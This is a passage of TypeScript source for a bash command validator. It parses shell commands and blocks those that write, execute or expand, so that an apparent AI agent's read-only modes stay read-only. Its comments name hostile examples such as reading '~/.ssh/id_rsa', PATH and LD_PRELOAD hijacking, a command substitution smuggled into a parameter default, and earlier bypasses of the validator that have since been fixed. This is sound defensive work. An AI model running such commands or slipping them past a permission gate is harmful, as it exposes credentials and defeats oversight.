/**
 * Bash Command Validator
 *
 * Uses bash-parser to create a proper AST and validate commands against the read-only allowlist (Plan, Don't ask).
 * This enables compound commands like `git status && git log` to be allowed
 * when all parts are safe, while still blocking dangerous constructs.
 *
 * AST Node Types:
 * - Command: Simple command with name and args
 * - LogicalExpression: && (and) or || (or) chains
 * - Pipeline: Piped commands (|)
 * - Subshell: Commands in parentheses (...)
 * - Redirect: File redirections (>, >>, <)
 * - CommandExpansion: $(...) substitution
 */

/// <reference path="./bash-parser.d.ts" />
import bashParser from 'bash-parser';
import { PLUGIN_RUNTIME_ENV_KEYS } from '../plugins/data-paths.ts';
import { debug } from '../utils/debug.ts';
import type { CompiledBashPattern } from './mode-types.ts';

// ============================================================
// Types
// ============================================================

/**
 * Result of validating a bash command AST.
 * Tracks which subcommands passed/failed for detailed error messages.
 */
export interface BashValidationResult {
  allowed: boolean;
  /** Primary reason for rejection (if not allowed) */
  reason?: BashValidationReason;
  /** Individual results for compound commands */
  subcommandResults?: SubcommandResult[];
}

export interface SubcommandResult {
  /** The command text that was validated */
  command: string;
  allowed: boolean;
  reason?: string;
}

/**
 * Detailed reason why validation failed.
 * Used to generate helpful error messages.
 */
export type BashValidationReason =
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'parameter_expansion'; explanation: string }
  | { type: 'env_assignment'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'parse_error'; error: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] }
  | { type: 'background_execution'; explanation: string };

// ============================================================
// AST Node Types (from bash-parser)
// ============================================================

interface ASTNode {
  type: string;
}

interface WordNode extends ASTNode {
  type: 'Word';
  text: string;
  expansion?: ExpansionNode[];
  /**
   * The word's span in the ORIGINAL command string, inclusive of both ends and
   * of the QUOTE CHARACTERS — present only when the parse asked for it
   * (`insertLOC`). `text` is already unquoted, so the span is the only place the
   * quoting survives; see {@link wordMetacharactersAreLiteral}.
   */
  loc?: { start: { char: number }; end: { char: number } };
}

interface CommandNode extends ASTNode {
  type: 'Command';
  name?: WordNode;
  prefix?: ASTNode[];
  suffix?: ASTNode[];
  /** True if command runs in background with & operator */
  async?: boolean;
}

interface LogicalExpressionNode extends ASTNode {
  type: 'LogicalExpression';
  op: 'and' | 'or';
  left: ASTNode;
  right: ASTNode;
}

interface PipelineNode extends ASTNode {
  type: 'Pipeline';
  commands: ASTNode[];
}

interface SubshellNode extends ASTNode {
  type: 'Subshell';
  list: CompoundListNode;
}

interface CompoundListNode extends ASTNode {
  type: 'CompoundList';
  commands: ASTNode[];
}

interface RedirectNode extends ASTNode {
  type: 'Redirect';
  op: { text: string; type: string };
  file: WordNode;
}

interface ExpansionNode {
  type: string;
  command?: string;
  commandAST?: ScriptNode;
  /** ParameterExpansion only: the parameter as written, modifiers included. */
  parameter?: string;
  /** ParameterExpansion only: `:-`, `#`, `%`, `:=`, … as bash-parser names it. */
  op?: string;
  /** ParameterExpansion only: the modifier's operand, which may itself expand. */
  word?: WordNode;
}

interface ScriptNode extends ASTNode {
  type: 'Script';
  commands: ASTNode[];
}

// ============================================================
// Dangerous Argument Patterns
// ============================================================

/**
 * Command arguments that execute subcommands or perform writes.
 * These are program-level features (not shell constructs) that the AST parser
 * cannot detect — e.g., `find -exec` runs arbitrary commands despite `find`
 * being a read-only search tool.
 *
 * Checked BEFORE the regex allowlist pattern match in validateCommand().
 */
const DANGEROUS_COMMAND_ARGS: Record<string, Set<string>> = {
  // `-fprintf`, `-fprint`, `-fprint0` and `-fls` were MISSING until 2026-08-26,
  // and each names a FILE it creates or truncates: measured, `find . -fprintf
  // out.txt '%p'`, `-fprint out.txt`, `-fprint0 out.txt` and `-fls out.txt`
  // were all ALLOWED by the read-only allowlist (then Explore mode's) while `-delete` and `-exec` were refused.
  // They complete find's write/execute action set (GNU find: -delete, -exec,
  // -execdir, -ok, -okdir, -fls, -fprint, -fprint0, -fprintf).
  find: new Set([
    '-exec', '-execdir', '-ok', '-okdir', '-delete',
    '-fprintf', '-fprint', '-fprint0', '-fls',
  ]),
};

const AWK_COMMANDS = new Set(['awk', 'gawk', 'mawk', 'nawk']);

/**
 * Whether an awk script REDIRECTS a print to a file, as opposed to merely
 * COMPARING with `>`.
 *
 * awk's grammar makes `>` ambiguous, and POSIX resolves it: in
 * `print expr > expr` the `>` is a REDIRECT, and the only way to write a
 * greater-than COMPARISON in an output list is to parenthesise it —
 * `print (a > b)`, `printf("%d", a > b)`. So parenthesis depth is not a
 * heuristic here, it is the language's own disambiguation rule.
 *
 * The previous test was a single regex, `print…>…`, which could not see depth
 * and therefore refused `awk 'BEGIN{print (a>b)}'` — a script that writes
 * nothing — by the read-only allowlist (then Explore mode's) as well as under isolation (P2.109). Measured
 * over-blocks it removed: `print (a>b)`, `printf("%d", a>b)`,
 * `print ($1>$2)`, and a `>` inside a STRING (`print "a -> b"`), which is a
 * literal character and not an operator at all.
 *
 * Deliberately NOT relaxed: a `>` at depth 0 is still a redirect
 * (`print "x" > "/etc/x"`, `print > FILE`, `print (a) > "f"`), `>>` likewise,
 * and `>=` was already excluded. A string is skipped WHOLE, so a redirect
 * cannot hide behind one — the operator has to sit outside the quotes to be an
 * operator.
 */
function awkPrintRedirectsToFile(scriptText: string): boolean {
  const printStatement = /\b(?:print|printf)\b/gi;
  let match: RegExpExecArray | null;
  while ((match = printStatement.exec(scriptText)) !== null) {
    let depth = 0;
    for (let i = match.index + match[0].length; i < scriptText.length; i++) {
      const ch = scriptText[i];
      // The statement ends here; a `>` past it belongs to a later statement.
      if (ch === ';' || ch === '{' || ch === '}' || ch === '\n') break;
      if (ch === '"') {
        // A STRING is skipped whole (with backslash escapes), so a `>` inside
        // it is a printed character, never an operator.
        i++;
        while (i < scriptText.length && scriptText[i] !== '"') {
          if (scriptText[i] === '\\') i++;
          i++;
        }
        continue;
      }
      if (ch === '(') { depth++; continue; }
      if (ch === ')') {
        if (depth === 0) break;
        depth--;
        continue;
      }
      if (ch !== '>') continue;
      // Inside parentheses awk reads `>` as a comparison, never a redirect.
      if (depth > 0) continue;
      if (scriptText[i + 1] === '=') continue;
      let j = i + 1;
      if (scriptText[j] === '>') j++;
      while (j < scriptText.length && /\s/.test(scriptText[j] as string)) j++;
      const target = scriptText[j];
      if (target === undefined) continue;
      if (target === '=' || target === '&' || target === '|' || target === ';') continue;
      return true;
    }
  }
  return false;
}

function getDangerousAwkReason(commandParts: string[]): string | null {
  const optionReason = getDangerousAwkOptionReason(commandParts); if (optionReason !== null) return optionReason; // [0] is awk/gawk/mawk/nawk; options + @-directives: UA12.183 (file end); UA12.103: awk's `\`+newline SEPARATES tokens (a space, never '')
  const scriptText = commandParts.slice(1).join(' ').replace(/\\\r?\n/g, ' ');

  if (/\bsystem\s*\(/i.test(scriptText) || /\bsystem\b/.test(scriptText)) { // bare `system` too: BWK awk runs system($0) (UA12.103)
    return 'awk system() executes arbitrary shell commands';
  }

  // command | getline (and gawk's two-way command |& getline) executes an external command and reads from it
  if (/\|&?\s*getline\b/i.test(scriptText)) {
    return 'awk command pipes to getline execute external commands';
  }

  // print/printf ... | cmd or |& cmd (quoted, or in a variable) runs a command; `||` is OR; [\s\S]: word.text turns a string's `\n` into a newline
  if (/\bprintf?\b[\s\S]*(?<!\|)\|(?!\|)/i.test(scriptText)) {
    return 'awk print-to-command pipes execute external commands';
  }

  // print/printf redirected to a FILE (`print … > file`, `>> file`) writes the
  // filesystem, the same way the pipe-to-command form above executes a program.
  if (awkPrintRedirectsToFile(scriptText)) {
    return 'awk print/printf redirected to a file writes the filesystem';
  }

  return null;
}

/**
 * The sed implementations whose SCRIPT can carry an execution primitive.
 */
const SED_COMMANDS = new Set(['sed', 'gsed']);

/** What {@link scanSedScriptForExec} could conclude about a script. */
type SedScriptVerdict = 'executes' | 'clean' | 'unparsed';

/**
 * Walk a sed script and decide whether it reaches sed's EXECUTION primitive.
 *
 * ## Why this is a walk and not a letter test
 *
 * The file-WRITE axis is closed by absence of the letter `w`
 * ({@link sedScriptMayWriteFile}) — an invariant, because `w` hides after an
 * address, a regex, a substitution delimiter, and with no space at all. The
 * same test cannot close the EXECUTION axis: GNU sed's `e` command (`e CMD`)
 * and `s///e` flag run a shell, but the letter `e` is ubiquitous in ordinary
 * read scripts (`/error/p`, `s/e/E/p`, `s/emphasis/EMPH/gp`), so refusing every
 * script containing an `e` would refuse most real sed reads. Measured: of this
 * repository's own sed invocations, the ones carrying an `e` are all reads.
 *
 * So the axis is MODELLED instead — but only far enough to answer one question,
 * "is this `e` in COMMAND or s///-FLAG position", and every uncertainty falls to
 * the safe side. The walk never has to be right; it only has to be right or
 * UNSURE, and {@link sedScriptExecutesShell} turns unsure into a refusal
 * whenever an `e` could be hiding there. A misparse therefore costs over-block,
 * never a bypass.
 *
 * ## Which half of this function is load-bearing (measured, and not the obvious one)
 *
 * The `'executes'` verdicts are an EARLY EXIT, not the protection. Deleting the
 * `cmd === 'e'` branch outright changes no verdict at all: the walk then ends as
 * `'unparsed'`, and a script that spells the `e` command necessarily contains an
 * `e`, so {@link sedScriptExecutesShell}'s residue test refuses it anyway. That
 * was confirmed by planting exactly that mutation — the whole suite stayed green.
 *
 * The load-bearing output is `'clean'`. It is the only verdict that suppresses
 * the residue test, so the mutation that actually opens a bypass is one that
 * makes this walk call an `e`-bearing script CLEAN (for instance by treating `e`
 * as an ordinary command and walking past it). That is the mutation the tests
 * are aimed at, and stating it here is the point: the next maintainer editing
 * this function needs to know which direction is dangerous.
 *
 * The grammar walked: optional address (`$`, a line number, `first~step`,
 * `/re/`, `\cREc`, with `I`/`M` modifiers and a `,` range), any number of `!`
 * negations, then the command — `e` (execution), `s`/`y` (delimited, then a
 * flag run in which `e` is also execution), the text commands `a i c`, the
 * filename commands `r R w W`, the label commands `b t T :`, and the plain
 * one-letter commands. Anything else ends the walk as `unparsed`.
 */
function scanSedScriptForExec(script: string): SedScriptVerdict {
  const len = script.length;
  const isBlank = (c: string | undefined): boolean =>
    c === ' ' || c === '\t' || c === '\n' || c === ';';
  const isDigit = (c: string | undefined): boolean => c !== undefined && c >= '0' && c <= '9';
  /** Index just past the closing `delim`, or -1 when it is unterminated. */
  const skipDelimited = (from: number, delim: string): number => {
    for (let k = from; k < len; k++) {
      const c = script[k];
      if (c === '\\') { k++; continue; }
      if (c === delim) return k + 1;
    }
    return -1;
  };
  const skipToLineEnd = (from: number): number => {
    for (let k = from; k < len; k++) if (script[k] === '\n') return k + 1;
    return len;
  };

  let i = 0;
  while (i < len) {
    while (i < len && isBlank(script[i])) i++;
    if (i >= len) break;
    if (script[i] === '#') { i = skipToLineEnd(i); continue; }
    if (script[i] === '{' || script[i] === '}') { i++; continue; }

    // ---- optional address, optionally a `,`-separated range ----
    for (let part = 0; part < 2; part++) {
      const c = script[i];
      if (c === undefined) break;
      if (c === '$') { i++; }
      else if (isDigit(c)) {
        while (isDigit(script[i])) i++;
        if (script[i] === '~') { i++; while (isDigit(script[i])) i++; }
      } else if (c === '/') {
        const end = skipDelimited(i + 1, '/');
        if (end < 0) return 'unparsed';
        i = end;
        while (script[i] === 'I' || script[i] === 'M') i++;
      } else if (c === '\\') {
        const delim = script[i + 1];
        if (delim === undefined) return 'unparsed';
        const end = skipDelimited(i + 2, delim);
        if (end < 0) return 'unparsed';
        i = end;
        while (script[i] === 'I' || script[i] === 'M') i++;
      } else break;
      if (part === 0 && script[i] === ',') {
        i++;
        if (script[i] === '+' || script[i] === '~') i++;
        continue;
      }
      break;
    }
    while (script[i] === ' ' || script[i] === '\t') i++;
    while (script[i] === '!') { i++; while (script[i] === ' ' || script[i] === '\t') i++; }

    const cmd = script[i];
    if (cmd === undefined) break;
    i++;

    // GNU sed's `e` COMMAND: `e` runs the pattern space as a shell command,
    // `e CMD` runs CMD. Either way it is execution.
    if (cmd === 'e') return 'executes';

    if (cmd === 's' || cmd === 'y') {
      const delim = script[i];
      if (delim === undefined || delim === '\\' || delim === '\n') return 'unparsed';
      let k = skipDelimited(i + 1, delim);
      if (k < 0) return 'unparsed';
      k = skipDelimited(k, delim);
      if (k < 0) return 'unparsed';
      i = k;
      for (;;) {
        const flag = script[i];
        if (flag === undefined) break;
        // The `e` FLAG runs the substitution result as a shell command.
        if (flag === 'e') return 'executes';
        // `w FILE`/`W FILE` consume the rest of the line; the WRITE axis is
        // {@link sedScriptMayWriteFile}'s to judge, not this one's.
        if (flag === 'w' || flag === 'W') { i = skipToLineEnd(i); break; }
        if (flag === 'g' || flag === 'p' || flag === 'i' || flag === 'I'
          || flag === 'm' || flag === 'M' || isDigit(flag)) { i++; continue; }
        break;
      }
      continue;
    }

    // Commands whose argument runs to end of line: appended/inserted/changed
    // text, and the filename commands.
    if (cmd === 'a' || cmd === 'i' || cmd === 'c'
      || cmd === 'r' || cmd === 'R' || cmd === 'w' || cmd === 'W') {
      i = skipToLineEnd(i);
      continue;
    }
    // Label commands: the label runs to the next separator.
    if (cmd === 'b' || cmd === 't' || cmd === 'T' || cmd === ':') {
      while (i < len && script[i] !== ';' && script[i] !== '\n' && script[i] !== '}') i++;
      continue;
    }
    // Plain commands, some of which take a numeric argument (`q5`, `l80`).
    if ('pdDgGhHnNPxzFlqQ=#'.includes(cmd)) {
      while (isDigit(script[i])) i++;
      continue;
    }
    return 'unparsed';
  }
  return 'clean';
}

/**
 * Whether a sed script reaches an execution primitive, failing closed on doubt.
 *
 * `unparsed` is refused ONLY when an `e` is present at all, which is what keeps
 * the letter test — unusable as a whole-script rule — usable as the residue
 * rule for the scripts the walk could not classify.
 */
function sedScriptExecutesShell(script: string): boolean {
  const verdict = scanSedScriptForExec(script);
  if (verdict === 'executes') return true;
  return verdict === 'unparsed' && script.includes('e');
}

/**
 * sed's EXECUTION primitive, in the same position {@link getDangerousAwkReason}
 * occupies for awk: a program-level feature invisible to the shell AST, checked
 * before the read-only allowlist by BOTH the Explore gate
 * ({@link validateCommand}) and the isolation write-scan
 * ({@link commandBaseIsReadOnly}).
 *
 * Measured, and the reason this is not deferred to the shipped platform: BSD
 * sed (macOS, `/usr/bin/sed`) rejects both forms — `sed: 1: "e touch marker":
 * invalid command code e` and `bad flag in substitute command: 'e'` — but
 * `apps/electron/scripts/build-linux.sh` ships a Linux target, and Linux sed is
 * GNU sed, where `e` EXECUTES. The macOS measurement is therefore a statement
 * about one build, not about the primitive.
 */
function getDangerousSedReason(commandParts: string[]): string | null {
  for (const script of sedScriptTexts(commandParts)) {
    if (sedScriptExecutesShell(script)) {
      return "sed's `e` command/flag executes shell commands (GNU sed)";
    }
  }
  return null;
}

// ============================================================
// Validation Logic
// ============================================================

/**
 * Validate a bash command using AST analysis.
 *
 * @param command - The bash command string to validate
 * @param patterns - Compiled regex patterns for allowed commands
 * @returns Validation result with detailed reason if rejected
 */
export function validateBashCommand(
  command: string,
  patterns: CompiledBashPattern[]
): BashValidationResult {
  // Parse the command into an AST (with spans: the argv inspectors read the words bash passes, {@link shellArgv})
  let ast: ScriptNode;
  try {
    ast = bashParser(command, { insertLOC: true }) as ScriptNode;
  } catch (error) {
    debug('[BashValidator] Parse error:', error);
    return {
      allowed: false,
      reason: {
        type: 'parse_error',
        error: error instanceof Error ? error.message : String(error),
      },
    };
  }

  // Validate the AST recursively
  const subcommandResults: SubcommandResult[] = [];
  const result = withInspectedSource(command, () => validateNode(ast, patterns, subcommandResults));

  return {
    ...result,
    subcommandResults: subcommandResults.length > 0 ? subcommandResults : undefined,
  };
}

/**
 * Recursively validate an AST node.
 */
function validateNode(
  node: ASTNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  switch (node.type) {
    case 'Script':
      return validateScript(node as ScriptNode, patterns, results);

    case 'Command':
      return validateCommand(node as CommandNode, patterns, results);

    case 'LogicalExpression':
      return validateLogicalExpression(node as LogicalExpressionNode, patterns, results);

    case 'Pipeline':
      // Validate each command in the pipeline individually.
      // If all commands are in the allowlist, the pipeline is safe.
      // e.g., `git log | head` is allowed because both commands are read-only.
      return validatePipeline(node as PipelineNode, patterns, results);

    case 'Subshell':
      return validateSubshell(node as SubshellNode, patterns, results);

    case 'CompoundList':
      return validateCompoundList(node as CompoundListNode, patterns, results);

    default:
      // Unknown node type — fail closed. bash-parser may produce node types
      // we don't explicitly handle (If, While, For, Case, Function, etc.).
      // Block them rather than silently allowing arbitrary constructs.
      debug('[BashValidator] Unknown node type (blocked):', node.type);
      return {
        allowed: false,
        reason: {
          type: 'parse_error',
          error: `Unsupported shell construct: "${node.type}". Only simple commands, pipelines, logical expressions (&&/||), and subshells are supported by the read-only command check of Plan and Don't ask modes`,
        },
      };
  }
}

/**
 * Validate a Script node (top-level).
 */
function validateScript(
  node: ScriptNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  for (const cmd of node.commands) {
    const result = validateNode(cmd, patterns, results);
    if (!result.allowed) {
      return result;
    }
  }
  return { allowed: true };
}

/**
 * Validate a simple Command node.
 * Checks for:
 * 1. Command name matches safe patterns
 * 2. No redirects in suffix
 * 3. No command expansions in any word
 */
function validateCommand(
  node: CommandNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  // Check for background execution (&) - always blocked as it allows
  // running commands asynchronously which could hide malicious activity
  if (node.async) {
    return {
      allowed: false,
      reason: {
        type: 'background_execution',
        explanation: 'Background execution (&) runs commands asynchronously which could hide malicious activity',
      },
    };
  }

  // Build the full command string for pattern matching
  const commandParts: string[] = [];

  // Add command name
  if (node.name) {
    // Check for expansions in command name (and a brace expansion, {@link braceExpansionReason})
    const expansionCheck = checkWordForExpansions(node.name) ?? braceExpansionReason(node.name);
    if (expansionCheck) {
      return { allowed: false, reason: expansionCheck };
    }
    commandParts.push(node.name.text);
  }

  // Add prefix (assignments, redirects before command)
  if (node.prefix) {
    for (const item of node.prefix) {
      if (item.type === 'Redirect') {
        const redirect = item as RedirectNode;
        const targetExpansion = redirectTargetExpansionReason(redirect); // then: safe redirects (input, /dev/null) pass
        if (targetExpansion || !isRedirectSafe(redirect)) {
          return {
            allowed: false,
            reason: targetExpansion ?? {
              type: 'redirect',
              op: redirect.op.text,
              explanation: getRedirectExplanation(redirect.op.text),
            },
          };
        }
      }

      // Block environment variable assignments in command prefix.
      // e.g., PATH=/evil ls, LD_PRELOAD=/evil/lib.so ls, FOO=bar cmd
      // These modify the command's environment, potentially enabling
      // PATH hijacking or library injection (LD_PRELOAD).
      if (item.type === 'AssignmentWord') {
        return {
          allowed: false,
          reason: {
            type: 'env_assignment',
            explanation: `Environment variable assignment "${(item as WordNode).text}" modifies command behavior (e.g., PATH hijacking, LD_PRELOAD injection)`,
          },
        };
      }
    }
  }

  // Add suffix (arguments, redirects after command)
  if (node.suffix) {
    for (const item of node.suffix) {
      if (item.type === 'Redirect') {
        const redirect = item as RedirectNode;
        const targetExpansion = redirectTargetExpansionReason(redirect); // then: safe redirects (input, /dev/null) pass
        if (targetExpansion || !isRedirectSafe(redirect)) {
          return {
            allowed: false,
            reason: targetExpansion ?? {
              type: 'redirect',
              op: redirect.op.text,
              explanation: getRedirectExplanation(redirect.op.text),
            },
          };
        }
      } else if (item.type === 'Word') {
        const word = item as WordNode;

        // Check for command expansions in arguments (and a brace expansion, {@link braceExpansionReason})
        const expansionCheck = checkWordForExpansions(word) ?? braceExpansionReason(word);
        if (expansionCheck) {
          return { allowed: false, reason: expansionCheck };
        }

        commandParts.push(word.text);
      }
    }
  }

  // Check for command arguments that enable sub-command execution or writes.
  // e.g., `find -exec touch file \;` — the `-exec` flag runs arbitrary commands.
  // These are program-level features invisible to the shell AST.
  const cmdName = node.name?.text;
  if (cmdName) {
    const normalizedCmd = programNameKey(cmdName); // UA12.215 follow-up (file end): `rg.exe` is rg

    if (AWK_COMMANDS.has(normalizedCmd)) {
      const awkReason = unquotedGlobReason(normalizedCmd, commandParts, index => wordIsShellLiteral(node, index)) ?? getDangerousAwkReason(commandParts); // UA12.207 (file end): a glob bash expands first
      if (awkReason) {
        const subResult: SubcommandResult = {
          command: commandParts.join(' '),
          allowed: false,
          reason: awkReason,
        };
        results.push(subResult);
        return {
          allowed: false,
          reason: {
            type: 'unsafe_command',
            command: commandParts.join(' '),
            explanation: awkReason,
          },
        };
      }
    }

    if (hasArgvInspector(normalizedCmd) || !globSafeHead(normalizedCmd)) { // sed (the `e` scanner + UA12.72), sort, gh api, rg (UA12.215) and grep (UA12.216) — see argvInspectorReason; any other head for its glob (UA12.212 follow-up)
      const sedReason = unquotedGlobReason(normalizedCmd, commandParts, index => wordIsShellLiteral(node, index)) ?? (hasArgvInspector(normalizedCmd) ? argvInspectorReason(normalizedCmd, commandParts, node) : null); // UA12.212 (file end)
      if (sedReason) {
        const subResult: SubcommandResult = {
          command: commandParts.join(' '),
          allowed: false,
          reason: sedReason,
        };
        results.push(subResult);
        return {
          allowed: false,
          reason: {
            type: 'unsafe_command',
            command: commandParts.join(' '),
            explanation: sedReason,
          },
        };
      }
    }

    if (DANGEROUS_COMMAND_ARGS[normalizedCmd]) {
      const dangerousArgs = DANGEROUS_COMMAND_ARGS[normalizedCmd];
      for (const part of commandParts) {
        if (dangerousArgs.has(part)) {
          const subResult: SubcommandResult = {
            command: commandParts.join(' '),
            allowed: false,
            reason: `Argument "${part}" executes subcommands or performs writes`,
          };
          results.push(subResult);
          return {
            allowed: false,
            reason: {
              type: 'unsafe_command',
              command: commandParts.join(' '),
              explanation: `"${part}" allows arbitrary command execution or file modification within "${normalizedCmd}"`,
            },
          };
        }
      }
    }
  }

  // Build the command string and check against patterns
  const commandStr = commandParts.join(' ');

  // Check if command matches any safe pattern
  const matchesPattern = patterns.some(pattern => pattern.regex.test(commandStr));

  const subResult: SubcommandResult = {
    command: commandStr,
    allowed: matchesPattern,
    reason: matchesPattern ? undefined : 'Not in read-only allowlist',
  };
  results.push(subResult);

  if (!matchesPattern) {
    return {
      allowed: false,
      reason: {
        type: 'unsafe_command',
        command: commandStr,
        explanation: 'Command is not in the read-only allowlist',
      },
    };
  }

  return { allowed: true };
}

/**
 * Validate a LogicalExpression (&&, ||).
 * Both sides must be valid for the expression to be allowed.
 */
function validateLogicalExpression(
  node: LogicalExpressionNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  // Validate left side
  const leftResult = validateNode(node.left, patterns, results);
  if (!leftResult.allowed) {
    return leftResult;
  }

  // Validate right side
  const rightResult = validateNode(node.right, patterns, results);
  if (!rightResult.allowed) {
    return rightResult;
  }

  return { allowed: true };
}

/**
 * Validate a Pipeline node (cmd1 | cmd2 | ...).
 * Each command in the pipeline must be valid for the whole pipeline to be allowed.
 */
function validatePipeline(
  node: PipelineNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  for (const cmd of node.commands) {
    const result = validateNode(cmd, patterns, results);
    if (!result.allowed) {
      return result;
    }
  }
  return { allowed: true };
}

/**
 * Validate a Subshell node (...).
 * The inner commands must all be valid.
 */
function validateSubshell(
  node: SubshellNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  return compoundRedirectRejection(node) ?? validateNode(node.list, patterns, results);
}

/**
 * Validate a CompoundList (list of commands in subshell or similar).
 */
function validateCompoundList(
  node: CompoundListNode,
  patterns: CompiledBashPattern[],
  results: SubcommandResult[]
): BashValidationResult {
  for (const cmd of node.commands) {
    const result = validateNode(cmd, patterns, results);
    if (!result.allowed) {
      return result;
    }
  }
  return compoundRedirectRejection(node) ?? { allowed: true };
}

/**
 * The only parameter names an otherwise-refused command may expand, sourced
 * from the env builders themselves so this set cannot drift from what is
 * actually injected.
 */
const HOST_COMPUTED_PLUGIN_PATH_NAMES: ReadonlySet<string> = new Set(PLUGIN_RUNTIME_ENV_KEYS);

/**
 * True for the PLAIN expansion — `$NAME` or `${NAME}` — of a name the host
 * computes and injects itself.
 *
 * What stays blocked, and why the line is drawn here:
 *
 * - Every other variable. `${HOME}`, `$PATH`, anything the author invents: the
 *   original reason holds unchanged — the command's behaviour would depend on
 *   environment state we did not compute (`cat $HOME/.ssh/id_rsa`).
 * - `$(...)`, backticks, `<(...)`/`>(...)`: untouched by this exception. They
 *   execute embedded commands, which no path reference ever needs.
 * - EVERY modifier form of a permitted name, which is what `op`/`word` gate:
 *   `${X:-…}`, `${X:=…}`, `${X#…}`, `${X%…}` carry an `op` plus an operand
 *   `word`; `${!X}`, `${#X}` and `${X/a/b}` are not exact-name matches because
 *   bash-parser folds the modifier into `parameter` itself (`!NESSY_PLUGIN_ROOT`,
 *   `NESSY_PLUGIN_ROOT/a/b`). This is not tidiness. bash-parser nests the
 *   operand's own expansions inside `exp.word.expansion`, where this function's
 *   top-level scan never looks, so `${NESSY_PLUGIN_ROOT:-$(whoami)}` would
 *   smuggle a command substitution straight through the permitted name.
 *   Measured on bash-parser's AST, not assumed.
 *
 * Why a permitted expansion cannot become injection:
 *
 * - The VALUES are host-computed absolute paths, never author or model text.
 *   `bundleRoot` is `pluginStore.cachePathFor(cacheRef)` — the host's own
 *   content-addressed cache path; `dataPath` is `resolvePluginDataPath`, a
 *   containment-checked directory under the host data root; `projectPath` is
 *   the server-validated project root ("never renderer-supplied",
 *   `capabilities/resolver.ts`). A manifest cannot author any of the three, and
 *   the only manifest-authored hook env is the namespaced
 *   `CLAUDE_PLUGIN_OPTION_*`, which is not in this set.
 * - Even if a value were hostile, POSIX expansion results are field-split and
 *   pathname-expanded, never re-tokenized: a `;`, a `|` or a `$(…)` arriving
 *   from a variable's value is data, not syntax.
 * - The allowlist match still runs on the LITERAL command text, `${…}` and all,
 *   so a permitted expansion cannot introduce a command name that was not
 *   already matched — including in the command-name position, where
 *   `"${NESSY_PLUGIN_ROOT}/bin/tool"` matches no read-only pattern and is
 *   refused as before.
 *
 * A permitted name that is NOT set expands to empty, which yields a path that
 * does not exist rather than a hazard. It is set wherever a plugin hook runs:
 * `capabilities/runtime-automations.ts` puts `pluginRuntimeEnvForProfile` on the
 * action, `automations/hook-command.ts:buildHookCommandEnv` merges it into the
 * spawn env, and both execution authorities (`runHookCommand` and the host's
 * supervised runner) hand that env to the child.
 */
function isHostComputedPluginPathExpansion(exp: ExpansionNode): boolean {
  return typeof exp.parameter === 'string'
    && HOST_COMPUTED_PLUGIN_PATH_NAMES.has(exp.parameter)
    && exp.op === undefined
    && exp.word === undefined;
}

/**
 * Check a Word node for dangerous expansions.
 * Returns a rejection reason if found, null if safe.
 */
function checkWordForExpansions(word: WordNode): BashValidationReason | null {
  if (!word.expansion) {
    return null;
  }

  for (const exp of word.expansion) {
    if (exp.type === 'CommandExpansion' || exp.type === 'ArithmeticExpansion') { // arithmetic: UA12.83 follow-up (reason (b))
      return {
        type: 'command_expansion',
        explanation: `${exp.type === 'ArithmeticExpansion' ? 'Arithmetic expansion $((...)) runs any `cmd` or $(cmd) inside it' : 'Command substitution $(...) executes embedded commands'} (found in: ${word.text})`,
      };
    }

    // Process substitution <(...) or >(...)
    // bash-parser may represent these differently, check for common patterns
    if (exp.type === 'ProcessSubstitution') {
      return {
        type: 'process_substitution',
        explanation: `Process substitution executes commands (found in: ${word.text})`,
      };
    }

    // Parameter expansion ($VAR, ${VAR}, ${VAR:-default}) can make commands
    // behave unpredictably based on environment state.
    // e.g., `cat $HOME/.ssh/id_rsa` reads sensitive files via expansion.
    if (exp.type === 'ParameterExpansion') {
      // …with ONE exception: the variables the host itself injects into a
      // plugin runtime process. A plugin-bundled hook has no other way to name
      // a file inside its own bundle — the install path is content-addressed
      // and unknowable to the author — so `${NESSY_PLUGIN_ROOT}/hooks/x.js` is
      // the documented mechanism, and `plugins/data-paths.ts` emits exactly
      // these names for exactly that purpose. Refusing them made the mechanism
      // we ship unusable (Q5-D1, measured live on the 1.25.1 artifact).
      if (isHostComputedPluginPathExpansion(exp)) continue;
      return {
        type: 'parameter_expansion',
        explanation: `Variable expansion \${...} makes command behavior dependent on environment state (found in: ${word.text})`,
      };
    }
  }

  return null;
}

/**
 * Safe input redirect operators that don't write to files.
 */
const SAFE_INPUT_REDIRECTS = new Set([
  '<',    // Input redirect - read-only
  '<&',   // Duplicate input file descriptor
]);

/**
 * Check if a redirect is safe (read-only or to /dev/null).
 *
 * Safe redirects:
 * - Input redirects: <, <&
 * - Output redirects to /dev/null (e.g., >/dev/null, 2>/dev/null)
 * - File descriptor duplication (e.g., 2>&1) - just duplicates, doesn't write to file
 */
function isRedirectSafe(redirect: RedirectNode): boolean {
  const op = redirect.op.text;

  // Input redirects are always safe (read-only)
  if (SAFE_INPUT_REDIRECTS.has(op)) {
    return true;
  }

  const target = redirect.file?.text;

  // Output redirects to /dev/null are safe
  if (target === '/dev/null') {
    return true;
  }

  // File descriptor duplication (e.g., 2>&1) is safe - it just redirects to another fd
  // These have targets like "1", "2" (file descriptor numbers)
  if (op === '>&' && target && /^\d+$/.test(target)) {
    return true;
  }

  return false;
}

/**
 * Get explanation for a redirect operator.
 */
function getRedirectExplanation(op: string): string {
  const explanations: Record<string, string> = {
    '>': 'overwrites file contents',
    '>>': 'appends to file',
    '>&': 'redirects file descriptors',
    '>|': 'forces overwrite (clobber)',
    '<<': 'here-document could inject arbitrary content',
  };

  return explanations[op] || `redirect operator "${op}" modifies file I/O`;
}

/**
 * Check if the command string contains dangerous control characters.
 *
 * Note: Newlines and carriage returns are NOT blocked here because bash-parser
 * correctly parses them as command separators, and the AST validation will
 * check each command individually. Only null bytes are blocked as they could
 * cause issues at lower levels (C bindings, string handling).
 */
export function hasControlCharacters(command: string): { char: string; explanation: string } | null {
  const dangerous: Record<string, string> = {
